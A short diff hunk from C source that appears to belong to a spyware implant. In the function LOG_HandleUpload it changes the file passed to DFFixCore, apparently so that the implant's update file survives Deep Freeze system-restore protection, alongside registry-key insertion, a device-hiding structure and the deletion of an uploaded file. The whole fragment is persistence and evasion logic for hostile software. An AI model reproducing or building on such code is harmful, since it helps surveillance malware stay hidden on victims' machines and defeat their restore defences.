@@ -1286,7 +1286,7 @@ BOOL LOG_HandleUpload(BOOL is_upload)
 				HM_InsertRegistryKey(H4_UPDATE_FILE, TRUE);
 				if (IsDeepFreeze()) {
 					HideDevice dev_df;
-					DFFixCore(&dev_df, (unsigned char *)H4DLLNAME, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, TRUE);
+					DFFixCore(&dev_df, (unsigned char *)H4_UPDATE_FILE, (unsigned char *)H4_HOME_PATH, (unsigned char *)REGISTRY_KEY_NAME, TRUE);
 				}
 			}
 			DeleteFile(HM_CompletePath(c_file_name, s_file_path));
